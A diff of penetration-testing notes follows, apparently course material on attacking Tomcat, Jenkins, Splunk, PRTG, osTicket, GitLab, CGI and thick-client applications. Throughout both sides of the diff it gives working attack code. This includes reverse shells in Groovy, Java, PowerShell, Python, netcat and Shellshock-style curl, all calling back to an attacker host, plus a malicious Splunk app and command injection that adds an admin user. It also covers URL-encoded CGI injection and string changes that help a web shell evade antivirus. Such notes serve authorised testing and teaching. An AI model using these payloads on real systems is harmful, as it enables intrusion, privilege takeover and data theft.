+Metasploit `multi/http/tomcat_mgr_upload` automates WAR upload. Changing a web shell's internal strings (e.g. mixed-casing "Uploaded:") can reduce AV detection.
 
-The fuzzdb cmd.jsp is under 1kb and flagged by only 2/58 AV vendors — changing one string (`"Uploaded:"` → `"uPlOaDeD:"`) dropped it to 0/58.
+### A Quick Note on Web shells
 
-On web shells generally: randomize the filename, limit access to your source IP, optionally password protect — don't leave a foothold a third party can hijack.
+Use a randomized (e.g. MD5-style) file name, restrict access by source IP, and password-protect uploaded web shells to prevent a "drive-by" attacker from finding and using them.
 
 ### CVE-2020-1938 : Ghostcat
 
-Unauthenticated LFI via the AJP protocol (binary proxy protocol, usually port 8009). Affects Tomcat before 9.0.31, 8.5.51, and 7.0.100. Confirm the port:
+Unauthenticated LFI via a misconfigured AJP protocol (port 8009 by default). Affects Tomcat <9.0.31, <8.5.51, <7.0.100. Exploit can only read files under the webapps folder (not e.g. `/etc/passwd`).
 
 ```bash
 nmap -sV -p 8009,8080 <TARGET_DOMAIN>
-```
-
-The exploit only reads files within the webapps folder (no `/etc/passwd`):
-
-```bash
 python2.7 tomcat-ajp.lfi.py <TARGET_DOMAIN> -p 8009 -f WEB-INF/web.xml
 ```
 
-`WEB-INF/web.xml` may hold sensitive data — routes, classes.
+`-p` AJP port | `-f` file to read
 
 ## Jenkins - Discovery & Enumeration
 
+Open-source Java CI/CD automation server, often run as SYSTEM/root.
+
 ### Discovery/Footprinting
 
-Runs on Tomcat port 8080 by default; port 5000 attaches slave servers (master/slave communication). Auth can be a local DB, LDAP, Unix users, delegated to the servlet container, or none at all — admins can also allow/disallow self-registration. Default install uses Jenkins' own database with registration disabled. The telltale login page fingerprints it quickly.
+Runs on Tomcat, port 8080 by default. Port 5000 used to attach slave servers. Auth can be local DB, LDAP, Unix user DB, delegated to the servlet container, or disabled entirely.
 
 ### Enumeration
 
-Check for weak/default credentials (`admin:admin`) or no authentication at all — unauthenticated Jenkins instances are not uncommon internally, and Jenkins often runs as root or SYSTEM, making it an easy AD foothold.
+Login page fingerprint at `/login?from=%2F`. Weak/default creds (`admin:admin`) or no authentication at all are common, even occasionally on external assessments.
 
 ## Attacking Jenkins
 
+Script console gives RCE via Groovy. Jenkins often runs as root/SYSTEM.
+
 ### Script Console
 
-`http://<TARGET_DOMAIN>:8000/script` runs arbitrary Groovy scripts in the Jenkins controller runtime — effectively a web shell. Command execution:
+At `/script`. Runs Groovy (compiles to Java bytecode).
 
 ```groovy
 def cmd = 'id'
@@ -540,11 +538,11 @@ proc.waitForOrKill(1000)
 println sout
 ```
 
-Linux reverse shell:
+Reverse shell (Linux, via /dev/tcp):
 
 ```groovy
 r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<ATTACKER_IP>/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<ATTACKER_IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
 
@@ -555,59 +553,62 @@ def cmd = "cmd.exe /c dir".execute();
 println("${cmd.text}");
 ```
 
-Windows Java reverse shell (swap host/port):
+Java reverse shell for Windows (swap host/port):
 
 ```groovy
 String host="<ATTACKER_IP>";
-int port=8044;
+int port=<PORT>;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-On Windows you could also add a user and connect over RDP/WinRM, or avoid system changes with a PowerShell download cradle + Invoke-PowerShellTcp.ps1.
-
 ### Miscellaneous Vulnerabilities
 
-- CVE-2018-1999002 + CVE-2019-1003000 combined → pre-authenticated RCE bypassing script security sandbox protection during script compilation. Public PoCs exploit a dynamic routing flaw to bypass the Overall/Read ACL and use Groovy to download and execute a malicious JAR — users with read permission can run code on the master. Works against Jenkins 2.137.
-- Jenkins 2.150.2: users with JOB creation and BUILD privileges can execute code via Node.js. Requires auth, but with anonymous access enabled it works unauthenticated — anonymous users hold those privileges by default.
+CVE-2018-1999002 + CVE-2019-1003000 combined bypass the script-security sandbox for pre-auth RCE (works against 2.137), abusing dynamic routing to bypass the Overall/Read ACL and downloading/executing a malicious JAR.
 
-Both fixed in current LTS; the exploits are version-specific.
+A separate flaw in 2.150.2 allows RCE via Node.js for users with JOB creation + BUILD privileges. Anonymous users get these by default if enabled.
 
 ## Splunk - Discovery & Enumeration
 
+Log analytics tool often used for security monitoring, frequently runs as root/SYSTEM. `CVE-2018-11409` info disclosure, `CVE-2011-4642` authenticated RCE (old versions).
+
 ### Discovery/Footprinting
 
-Web server on port 8000, management port 8089 (REST API). Frequently runs as root on Linux or SYSTEM on Windows. Very few known vulns and quick patching — the real focus is weak or null authentication, since admin access means deploying custom apps → RCE, potentially across the network.
-
-Older versions default to `admin:changeme`, conveniently displayed right on the login page. Newer versions set credentials at install — if defaults fail, try admin, Welcome, Welcome1, Password123.
+Web UI on port 8000 by default, management/REST API on port 8089.
 
 ```bash
-sudo nmap -sV <TARGET_IP>
-# 8000/tcp open ssl/http Splunkd httpd
-# 8089/tcp open ssl/http Splunkd httpd
+sudo nmap -sV <TARGET_IP> # identifies Splunkd httpd on 8000/8089
 ```
+
+Older versions show default creds `admin:changeme` on the login page. Newer versions set creds at install. Also try common weak passwords (`Welcome1`, `Password123`, etc.).
 
 ### Enumeration
 
-The Enterprise trial converts to the free version after 60 days — **no authentication at all**. Forgotten trial installs are a classic find. Once in (or on Free): browse data, run reports, install Splunkbase apps, install custom applications.
+A forgotten Enterprise Trial auto-converts to the Free license after 60 days, which has no authentication at all.
 
-Code execution avenues: server-side Django applications, REST endpoints, scripted inputs, alerting scripts. Scripted inputs exist to integrate Splunk with data sources — they run Bash, PowerShell, or Batch scripts, and every Splunk install ships with Python, so a Python reverse shell works on any Splunk system. Vulnerability scans against Splunk mostly return non-exploitable noise — know the built-in functionality route instead.
+RCE is commonly achieved via a scripted input (Bash, PowerShell, Batch, or Python, every Splunk install bundles Python) run through a malicious custom app.
 
 ## Attacking Splunk
 
+Custom app upload running a scripted input gives RCE in the context of the Splunk service account (often root/SYSTEM).
+
 ### Abusing Built-In Functionality
 
-Custom application with a scripted input. Structure:
+Custom app directory structure:
 
-```
+```text
 splunk_shell/
-├── bin        # scripts to run (rev.py / run.ps1 / run.bat)
-└── default    # inputs.conf
+├── bin
+└── default
 ```
 
-`default/inputs.conf` — enables the scripts and sets the run interval in seconds (scripts only run with this present):
+`bin/` holds the script to run, `default/inputs.conf` tells Splunk which script to run and how often.
 
-```ini
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+```text
 [script://./bin/rev.py]
 disabled = 0
 interval = 10
@@ -619,642 +620,518 @@ sourcetype = shell
 interval = 10
 ```
 
-`bin/run.bat` executes the PowerShell one-liner when the app deploys:
-
-```batch
+```cmd
 @ECHO OFF
 PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
 Exit
 ```
 
-`bin/run.ps1` — PowerShell reverse shell:
-
-```powershell
-$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-```
-
-Package it, start a listener, upload via Apps → Install app from file:
-
 ```bash
 tar -cvzf updater.tar.gz splunk_shell/
-sudo nc -lnvp 443
 ```
 
-The app is auto-enabled on upload → immediate callback. Module example came back as `NT AUTHORITY\SYSTEM`.
+Start a listener, then upload the tarball via Manage Apps > Install app from file, the app enables automatically and the shell fires on upload.
 
-Linux target — swap in a Python reverse shell (bin/rev.py), same process:
+```bash
+sudo nc -lnvp <PORT>
+```
+
+Linux target reverse shell script (`rev.py`):
 
 ```python
 import sys,socket,os,pty
 
 ip="<ATTACKER_IP>"
-port="443"
+port="<PORT>"
 s=socket.socket()
 s.connect((ip,int(port)))
 [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
 pty.spawn('/bin/bash')
 ```
 
-If the compromised host is a **deployment server**, place the app in `$SPLUNK_HOME/etc/deployment-apps` to push RCE to every host running a Universal Forwarder. UFs don't install Python — use the PowerShell version in Windows-heavy environments.
+If the compromised host is a deployment server, placing the app in `$SPLUNK_HOME/etc/deployment-apps` pushes it (and RCE) to all Universal Forwarders. Windows UFs don't ship Python, use the PowerShell version there.
 
 ## PRTG Network Monitor
 
+Agentless Delphi-based network monitor. Default creds and an authenticated command injection are the main footholds.
+
 ### Discovery/Footprinting/Enumeration
 
-Agentless network monitoring with an AJAX web interface, typically on ports 80, 443, or 8080 (port is changeable in Setup as admin):
+Common on ports 80, 443, 8080 (web interface port is configurable by an admin). Default creds `prtgadmin:prtgadmin`, often pre-filled on the login page.
 
 ```bash
-sudo nmap -sV -p- --open -T4 <TARGET_IP>
-# 8080/tcp open http Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
+curl -s http://<TARGET_IP>:<PORT>/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
 ```
-
-EyeWitness flags PRTG and its default credentials `prtgadmin:prtgadmin` — usually pre-filled on the login page and often unchanged. Nessus also detects it. Confirm the version:
-
-```bash
-curl -s http://<TARGET_IP>:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
-```
-
-(Module lab: version 17.3.33.2830; default creds failed, `prtgadmin:Password123` worked. HTB box Netmon showcases PRTG.)
 
 ### Leveraging Known Vulnerabilities
 
-**CVE-2018-9276** — authenticated command injection in the PRTG System Administrator console, before 18.2.39. When creating a notification, the **Parameter** field is passed directly into a PowerShell script with no sanitization.
+`CVE-2018-9276`: authenticated command injection in the System Administrator web console, affects PRTG <18.2.39. The Parameter field of a notification is passed unsanitized into a PowerShell script.
 
-Setup (top right) → Account Settings → Notifications → Add new notification → name it → tick **EXECUTE PROGRAM** → Program File: `Demo exe notification - outfile.ps1` → Parameter field:
+Setup > Account Settings > Notifications > Add new notification > tick EXECUTE PROGRAM > select an existing `.ps1` (e.g. `Demo exe notification - outfile.ps1`) > inject a command in the Parameter field.
 
+```text
+test.txt;net user <USERNAME> <PASSWORD> /add;net localgroup administrators <USERNAME> /add
 ```
-test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
-```
 
-Save, then click **Test** to execute. Blind — no output feedback, so verify out-of-band. Confirm local admin:
+Save, then click Test to trigger (blind, no output returned).
 
 ```bash
-sudo crackmapexec smb <TARGET_IP> -u prtgadm1 -p Pwn3d_by_PRTG!
+sudo crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> # confirm local admin access
 ```
-
-Then RDP, WinRM, evil-winrm, or impacket `wmiexec.py`/`psexec.py`. Scheduling the notification to run at a set time doubles as a persistence mechanism on long engagements.
 
 ## osTicket
 
+Open-source PHP/MySQL support ticketing system. Rarely vulnerable itself, but useful for OSINT and company email acquisition.
+
 ### Footprinting/Discovery/Enumeration
 
-PHP/MySQL support ticketing system. Fingerprint: `OSTSESSID` cookie, "powered by osTicket" logo in the footer, "Support Ticket System" text. Nmap only shows the underlying webserver — no app fingerprint.
-
-Functionally the app breaks down as user input → processing → solution: a user reports a problem, staff reproduce and debug it, and more technical staff get pulled into the email thread. That thread is where new email addresses and usernames surface — combined with "playing dumb" about a technical problem, a standard social engineering approach against support staff.
+Cookie `OSTSESSID` set on page visit. Footer often shows "powered by" osTicket / "Support Ticket System". `CVE-2020-24881`: SSRF in osTicket 1.14.1.
 
 ### Attacking osTicket
 
-osTicket 1.14.1 suffers CVE-2020-24881 (SSRF → internal resource access / port scanning), plus assorted historical RFI/SQLi/upload/XSS issues. But even a fully patched portal is attackable:
+Submitting a new ticket can yield a valid company email address (e.g. `<TICKET_ID>@<TARGET_DOMAIN>`), usable to register on other externally exposed services requiring email verification (Slack, Mattermost, GitLab, Bitbucket, etc.).
 
-- Submit a new ticket → the portal may assign a **temporary internal email address** for the ticket (module example: ticket 940288 → `940288@inlanefreight.local`). Emails sent to it appear in the ticket thread.
-- Use that address to register on other company services that require a valid company email and receive the confirmation email via the portal — Slack/Mattermost/Rocket.chat, GitLab, wikis. Demonstrated on HTB box **Delivery**.
+```bash
+sudo python3 dehashed.py -q <TARGET_DOMAIN> -p # search breach data for a domain
+```
 
-### osTicket - Sensitive Data Exposure
+`-q` query | `-p` search parameter
 
-Workflow from the module's external assessment:
+Agent ticket queues can leak cleartext passwords (e.g. standard new-joiner passwords reused across accounts) and an address book exportable for password spraying.
 
-1. OSINT with Dehashed — cleartext creds for company users:
-   ```bash
-   sudo python3 dehashed.py -q inlanefreight.local -p
-   ```
-2. Try them against the staff login `/scp/login.php` — the page accepts **email or username**; the module's `kevin@inlanefreight.local` worked when the username form didn't.
-3. Read the agent's closed tickets. One contained a VPN password-reset conversation: the agent reset the user's password to the **standard new-joiner password** and then sent it in cleartext through the portal.
-4. Reuse that standard password against the exposed VPN portal — and spray it against a user list built with linkedin2username, since lax password policies often skip forced change at first login.
-5. Export the address book — emails/usernames feed the same password spraying.
+## Gitlab - Discovery & Enumeration
 
-## GitLab - Discovery & Enumeration
+Self-hosted Git repo manager (Go/Ruby on Rails/Vue.js). Public/internal/private repos may leak secrets even without valid creds. Two-factor authentication is disabled by default.
 
 ### Footprinting & Discovery
 
-The login page with the GitLab logo identifies it. 2FA is disabled by default.
-
-- Version number is only visible at `/help` **when logged in**. If you can't register an account, don't blind-fire exploits — hunt for secrets instead. Notable exploited versions: GitLab 12.9.0, 11.4.7, and CE 13.10.3/13.9.3/13.10.2.
-- `/explore` lists public projects without authentication — dig for infrastructure details, production code to review, hardcoded credentials, scripts/configs with secrets, SSH or API keys.
-- Registration, if allowed, unlocks internal projects (module example: registering `hacker:Welcome` exposed an internal website project in `/explore`).
+Login page at `/users/sign_in` shows the GitLab logo. Version is only visible via `/help` when logged in (register first if self-registration is open).
 
 ### Enumeration
 
-The registration form is a **user and email enumerator**: "Username is already taken" / "Email has already been taken". Works on the latest version, and even with sign-up disabled in settings you can still browse `/users/sign_up` and enumerate users — you just can't register.
+`/explore` lists public projects/groups/snippets, check for hardcoded credentials, API keys, SSH keys.
 
-With a valid user list: weak-password guessing, spraying (Welcome1, Password123...), or reuse of creds from breach dumps.
+`/users/sign_up` can enumerate valid users/emails even if sign-up is disabled: an existing username returns "Username is already taken", an existing email returns "Email has already been taken".
+
+Registering an account (where allowed) may expose additional internal projects not visible unauthenticated.
 
 ## Attacking GitLab
 
+Username enumeration plus an authenticated ExifTool RCE are the key abuse paths.
+
 ### Username Enumeration
 
+Not treated as a vulnerability by GitLab, but still useful for password spraying.
+
 ```bash
-./gitlab_userenum.sh --url http://<TARGET_DOMAIN>:8081/ --userlist users.txt
+./gitlab_userenum.sh --url http://<TARGET_DOMAIN>:<PORT>/ --userlist <WORDLIST>
 ```
 
-Module run found `root` (the built-in admin) and `bob`.
+Default lockout: 10 failed attempts, 10-minute unlock (configurable via admin UI from v16.6+, `max_login_attempts` / `failed_login_attempts_unlock_period_in_minutes`).
 
-Lockout defaults below 16.6: 10 failed login attempts, automatic unlock after 10 minutes. From 16.6 these are configurable in the admin UI (`max_login_attempts`, `failed_login_attempts_unlock_period_in_minutes`):
-
-```ruby
+```text
 config.maximum_attempts = 10
 config.unlock_in = 10.minutes
 ```
 
 ### Authenticated Remote Code Execution
 
-GitLab Community Edition 13.10.2 and lower — ExifTool mishandles metadata in uploaded images → authenticated RCE. Any valid user works, so **self-registration + vulnerable version = instant RCE**:
+GitLab CE ≤13.10.2: authenticated RCE via ExifTool mishandling metadata in uploaded images.
 
 ```bash
-python3 gitlab_13_10_2_rce.py -t http://<TARGET_DOMAIN>:8081 -u <USERNAME> -p <PASSWORD> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <ATTACKER_IP> 8443 >/tmp/f '
+python3 gitlab_13_10_2_rce.py -t http://<TARGET_DOMAIN>:<PORT> -u <USERNAME> -p <PASSWORD> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f '
 ```
-
-Shell comes back as the `git` user.
 
 ## Attacking Tomcat CGI
 
-**CVE-2019-0232** — RCE on Windows when the CGI Servlet's `enableCmdLineArguments` is enabled. The query string is turned into command line arguments without proper validation → OS command injection using `&` as the batch separator. Affects Tomcat 9.0.0.M1–9.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93.
+`CVE-2019-0232`: Windows CGI Servlet command injection when `enableCmdLineArguments` is enabled. Affects Tomcat 9.0.0.M1–9.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93.
 
 ### Enumeration
 
 ```bash
 nmap -p- -sC -Pn <TARGET_IP> --open
-# 8080/tcp open http-proxy — Apache Tomcat/9.0.17
 ```
 
-The default CGI directory is `/cgi`. On Windows, fuzz for batch scripts — try both extensions:
+### Finding a CGI script
+
+Default CGI directory is `/cgi`, fuzz for script extensions.
 
 ```bash
-ffuf -w common.txt -u http://<TARGET_IP>:8080/cgi/FUZZ.cmd   # found nothing
-ffuf -w common.txt -u http://<TARGET_IP>:8080/cgi/FUZZ.bat   # found welcome.bat
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<TARGET_IP>:<PORT>/cgi/FUZZ.cmd
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<TARGET_IP>:<PORT>/cgi/FUZZ.bat
 ```
-
-Browsing `http://<TARGET_IP>:8080/cgi/welcome.bat` returns a placeholder message — still exploitable.
 
 ### Exploitation
 
-Append commands after `&`:
+Command injection via the `&` batch separator after a discovered CGI script.
 
-```
-http://<TARGET_IP>:8080/cgi/welcome.bat?&dir
-```
-
-`dir` works; `whoami` returns nothing. Pull the environment variables to see why:
-
-```
-http://<TARGET_IP>:8080/cgi/welcome.bat?&set
+```http
+http://<TARGET_IP>:<PORT>/cgi/<SCRIPT>.bat?&dir
 ```
 
-**PATH is unset** — hardcode binary paths. But `c:\windows\system32\whoami.exe` errors on the special characters (the patch added a regex filter) — URL-encode the payload:
+List environment variables (`PATH` is unset, so later commands need a hardcoded path):
 
+```http
+http://<TARGET_IP>:<PORT>/cgi/<SCRIPT>.bat?&set
 ```
-http://<TARGET_IP>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+
+A patched filter blocks special characters like `:` and `\`, bypass by URL-encoding the payload.
+
+```http
+http://<TARGET_IP>:<PORT>/cgi/<SCRIPT>.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
 ```
 
 ## Attacking Common Gateway Interface (CGI) Applications - Shellshock
 
-### Shellshock via CGI
-
-**CVE-2014-6271** — GNU Bash up to 4.3 executes commands placed after a function definition stored in an environment variable. Through CGI, injected HTTP headers (typically User-Agent) become environment variables → command execution as the web server user, usually www-data (root if the server runs elevated). Old, but still found during assessments, especially on IoT/embedded devices.
-
-Local check:
+`CVE-2014-6271` ("Bash bug"): vulnerable Bash (<4.3) executes commands placed after a function definition stored in an environment variable. Still found in the wild, especially on IoT/embedded devices using CGI. Patched Bash requires env function definitions to be prefixed `BASH_FUNC_`, breaking this technique.
 
 ```bash
-env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
+env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable" # local test
 ```
 
-Patched Bash prints only "not vulnerable" and no longer treats `y=() {...}` as a function definition (definitions must be prefixed `BASH_FUNC_` now).
-
-### Hands-on Example
-
-Hunt for CGI scripts:
+### Enumeration
 
 ```bash
-gobuster dir -u http://<TARGET_IP>/cgi-bin/ -w small.txt -x cgi
-# found access.cgi — 200 OK, empty body, still worth probing
+gobuster dir -u http://<TARGET_IP>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
 ```
 
-Confirm via the User-Agent field (Burp Repeater/Intruder fuzzing works too):
+### Exploitation
+
+Payload delivered via the `User-Agent` header (or any header/field Bash processes as an env var).
 
 ```bash
-curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://<TARGET_IP>/cgi-bin/access.cgi
-```
-
-Reverse shell one-liner:
-
-```bash
-curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/7777 0>&1' http://<TARGET_IP>/cgi-bin/access.cgi
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://<TARGET_IP>/cgi-bin/<SCRIPT>.cgi
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' http://<TARGET_IP>/cgi-bin/<SCRIPT>.cgi
 ```
 
 ## Attacking Thick Client Applications
 
-Locally installed enterprise apps (Java, C++, .NET, Silverlight). Two-tier = client talks directly to the database (best for us); three-tier routes through an app server over HTTP/HTTPS. Web-specific bugs like XSS/CSRF/Clickjacking don't apply, but these do: improper error handling, hardcoded sensitive data, DLL hijacking, buffer overflow, SQL injection, insecure storage, session management.
+Locally installed apps (Java, C++, .NET, Silverlight) that do more processing client-side. Web-specific attacks (XSS/CSRF/Clickjacking) don't apply, but many other classes do.
+
+Two-tier: app talks directly to the database. Three-tier: app talks to an application server (HTTP/HTTPS), which talks to the database. More secure since the attacker can't reach the DB directly, but the app server tier can still be vulnerable to SQLi/path traversal.
 
 ### Penetration Testing Steps
 
-1. **Information gathering** — architecture, languages/frameworks, client/server technologies, entry points, user inputs: CFF Explorer, Detect It Easy, Process Monitor, Strings.
-2. **Client side** — static analysis (hardcoded creds in source; reverse .NET/Java binaries: EXE, DLL, JAR, CLASS, WAR) plus dynamic analysis (sensitive data in memory): Ghidra, IDA, OllyDbg, Radare2, dnSpy, x64dbg, JADX, Frida.
-3. **Network side** — HTTP/HTTPS/TCP/UDP traffic analysis: Wireshark, tcpdump, TCPView, Burp Suite.
-4. **Server side** — standard web attacks, most of the OWASP Top Ten.
+#### Information Gathering
+
+Identify architecture, languages/frameworks, entry points and user inputs.
+
+`CFF Explorer` `Detect It Easy` `Process Monitor` `Strings`
+
+#### Client Side attacks
+
+Static analysis (reverse-engineer EXE/DLL/JAR/CLASS/WAR for hardcoded creds) and dynamic analysis (inspect memory for secrets).
+
+`Ghidra` `IDA` `OllyDbg` `Radare2` `dnSpy` `x64dbg` `JADX` `Frida`
+
+Common issue classes: improper error handling, hardcoded sensitive data, DLL hijacking, buffer overflow, SQL injection, insecure storage, session management.
+
+#### Network Side Attacks
+
+Traffic analysis can capture sensitive data sent over HTTP/HTTPS or TCP/UDP.
+
+`Wireshark` `tcpdump` `TCPView` `Burp Suite`
+
+#### Server Side Attacks
+
+Similar to standard web application attacks, most of the OWASP Top Ten applies.
 
 ### Retrieving Hardcoded Credentials from Thick-Client Applications
 
-Scenario: after landing SMB access, `Restart-Oracle-Service.exe` turns up on the NETLOGON share. Running it appears to do nothing.
+Scenario: an executable found on an SMB NETLOGON share drops and immediately deletes temp files.
 
-1. **ProcMon64** (SysInternals) shows it creates a temp file under `C:\Users\<user>\AppData\Local\Temp` — and deletes it.
-2. Block the deletion: Temp folder → Properties → Security → Advanced → Disable inheritance → convert inherited to explicit permissions → edit the user entry → uncheck **Delete subfolders and files** and **Delete**. Re-run the exe.
-3. A random-named `.bat` (e.g. `6F39.bat`) appears in `...\Temp\2`. Contents: username whitelist, a base64 blob echoed to `c:\programdata\oracle.txt`, a `monta.ps1` that decodes it into `restart-service.exe`, execution, then deletion of everything:
+Deny delete permissions on the target temp folder first (Properties > Security > Advanced > Disable inheritance > Convert inherited permissions to explicit > Edit > deselect Delete / Delete subfolders and files) so dropped files survive, then monitor with Process Monitor (ProcMon64) to catch them.
 
-```batch
-@shift /0
-@echo off
+A dropped batch script may contain a base64 blob plus a PowerShell snippet that reconstructs it to an EXE:
 
-if %username% == matt goto correcto
-if %username% == frankytech goto correcto
-if %username% == ev4si0n goto correcto
-goto error
-
-:correcto
-echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
-echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
-<SNIP base64 lines>
-echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt
-
-echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
-powershell.exe -exec bypass -file c:\programdata\monta.ps1
-del c:\programdata\monta.ps1
-del c:\programdata\oracle.txt
-c:\programdata\restart-service.exe
-del c:\programdata\restart-service.exe
+```powershell
+[System.IO.File]::WriteAllBytes("<PATH>", [System.Convert]::FromBase64String($salida))
 ```
 
-4. Strip the `del` lines, run the .bat by double-clicking → `oracle.txt`, `monta.ps1`, and the decoded `restart-service.exe` survive under `c:\programdata\`.
-5. **x64dbg**: Options → Preferences → uncheck everything except **Exit Breakpoint** (starts debugging at the exit point, skipping pre-load DLL noise). File → open `restart-service.exe` → right-click in the CPU view → Follow in Memory Map. Look for a MAP entry with size `0000000000003000`, protection `-RW--`. Double-click it — `MZ` magic bytes in the ASCII column means an embedded executable. Right-click the address → Dump Memory to File.
-6. `strings64.exe` on the dump shows `.NETFramework,Version=v4.0` — a .NET binary.
-7. **De4dot** (drag the dump onto it) strips the obfuscation → **dnSpy** opens the cleaned source. Verdict: a custom-made runas.exe that restarts the Oracle service with hardcoded credentials.
+To inspect a binary that resolves credentials at runtime, open it in `x64dbg` with Options > Preferences > uncheck all except Exit Breakpoint (starts debugging at the app's exit point, skipping DLL loads). Right-click the CPU view > Follow in Memory Map, look for a `RW` region (possible embedded PE, confirm via `MZ` magic bytes), then Dump Memory to File.
+
+```bash
+strings64.exe <DUMPED_FILE>.bin # confirm a .NET executable
+```
+
+Deobfuscate with De4Dot (drag the dumped binary onto the de4dot executable), then open the cleaned binary in `dnSpy` to read the decompiled C# source and recover hardcoded credentials.
 
 ## Exploiting Web Vulnerabilities in Thick-Client Applications
 
-Three-tier thick clients still fall to SQL injection and path traversal. Scenario: `fatty-client.jar` + three notes pulled from an anonymous FTP server — the notes said the server was moved to port **1337** (client still targets 8000), the app needs Java 8, and the login creds are `qtc / clarabibi`.
+Three-tier thick clients can still be vulnerable to SQLi and path traversal through the application server tier.
 
-### Foothold
-
-Login fails with "Connection Error!". Wireshark shows the client resolving `server.fatty.htb` and attempting TCP to port 8000. Point the hostname at the target (as admin):
+### Editing a Thick Client's Server Config
 
 ```cmd
-echo <TARGET_IP>    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts
+echo <TARGET_IP>    <TARGET_DOMAIN> >> C:\Windows\System32\drivers\etc\hosts
 ```
 
-Still port 8000 → patch the client. Extract the JAR, hunt for the port:
+Extract a JAR (right-click > Extract files), then search for a hardcoded value across the source.
 
 ```powershell
-ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List
-# match in beans.xml line 13
+ls <EXTRACTED_DIR>\ -recurse | Select-String "<PORT>" | Select Path, LineNumber | Format-List
 ```
 
-`beans.xml` (Spring config) — `<constructor-arg index="1" value = "8000"/>` under `connectionContext` → change to 1337. Same file also leaks the app secret: `clarabibiclarabibiclarabibi`.
+Spring config files (`beans.xml`) may hold the server host/port and shared secrets in `<constructor-arg>`/`<property>` elements.
 
-The edited JAR fails with an SHA-256 digest mismatch — it's signed, hashes live in `META-INF/MANIFEST.MF`. Remove all the `SHA-256-Digest` entries from MANIFEST.MF, delete `1.RSA` and `1.SF` from META-INF, keep a trailing newline:
+Signed JARs verify each file's SHA-256 hash listed in `META-INF/MANIFEST.MF` before running. To patch and re-run: edit the config, strip the `Name:`/`SHA-256-Digest:` entries from `MANIFEST.MF` (leave only the header, ending in a blank line), and delete the `.RSA`/`.SF` signature files from `META-INF`.
 
+```bash
+jar -cmf .\META-INF\MANIFEST.MF ..\<OUTPUT_FILE>.jar *
 ```
-Manifest-Version: 1.0
-Archiver-Version: Plexus Archiver
-Built-By: root
-Sealed: True
-Created-By: Apache Maven 3.3.9
-Build-Jdk: 1.8.0_232
